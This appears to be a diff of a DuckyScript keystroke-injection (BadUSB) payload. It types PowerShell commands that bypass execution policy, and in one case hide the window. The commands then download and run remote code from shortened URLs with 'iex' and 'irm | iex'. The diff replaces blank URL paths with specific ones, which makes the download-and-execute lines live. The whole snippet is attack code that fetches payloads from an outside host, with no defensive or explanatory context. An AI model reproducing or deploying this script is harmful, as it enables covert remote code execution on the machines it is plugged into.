@@ -23,7 +23,7 @@ DELAY 1000
 STRING powershell -NoP -Ep Bypass
 ENTER
 DELAY 1000
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://shorturl.at/'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://shorturl.at/agnGT'))
 ENTER
 DELAY 1500
 STRING TempDir
@@ -50,5 +50,5 @@ ENTER
 DELAY 600
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/ | iex
+STRING powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/gpvF5 | iex
 ENTER
